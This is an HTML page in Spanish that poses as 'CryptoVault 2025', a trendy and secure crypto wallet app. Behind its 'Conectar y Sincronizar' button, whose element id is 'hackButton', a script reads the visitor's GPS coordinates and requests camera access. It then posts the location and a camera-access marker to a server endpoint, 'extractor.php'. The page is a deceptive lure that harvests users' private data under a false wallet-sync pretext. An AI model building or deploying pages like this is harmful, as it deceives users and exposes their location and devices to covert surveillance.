<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>App Trendy: Tu Wallet Crypto Segura</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        h1 {
            color: #333;
            font-size: 24px;
        }
        p {
            color: #666;
            font-size: 16px;
        }
        button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
        }
        button:hover {
            background-color: #0056b3;
        }
        #status {
            margin-top: 10px;
            color: #28a745;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Bienvenido a CryptoVault 2025</h1>
        <p>La app más trendy para manejar tus criptomonedas. Conectate con tu teléfono para sincronizar y extraer datos de tu cartera de forma segura. ¡Únete a la revolución crypto!</p>
        <button id="hackButton">Conectar y Sincronizar</button>
        <p id="status"></p>
    </div>

    <script>
        document.getElementById('hackButton').addEventListener('click', function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const dataToSend = `Ubicación: ${lat},${lon}`;
                    sendExtractedData(dataToSend);
                }, function(error) {
                    document.getElementById('status').innerText = 'Error al acceder a tu ubicación.';
                });
            } else {
                document.getElementById('status').innerText = 'Geolocalización no soportada.';
            }

            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function(stream) {
                        // Simula captura y envía un marcador
                        stream.getTracks().forEach(track => track.stop());
                        sendExtractedData('Cámara accedida');
                    })
                    .catch(function(error) {
                        document.getElementById('status').innerText = 'Acceso a cámara denegado.';
                    });
            }
        });

        function sendExtractedData(data) {
            // Envía los datos extraídos a un archivo del lado del servidor vía Fetch
            fetch('extractor.php', {  // Este es el endpoint del servidor que manejará los datos
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ extractedData: data })
            })
            .then(response => response.text())
            .then(result => {
                document.getElementById('status').innerText = 'Datos enviados exitosamente al archivo.';
            })
            .catch(error => {
                document.getElementById('status').innerText = 'Error al enviar datos: ' + error;
            });
        }
    </script>
</body>
</html>
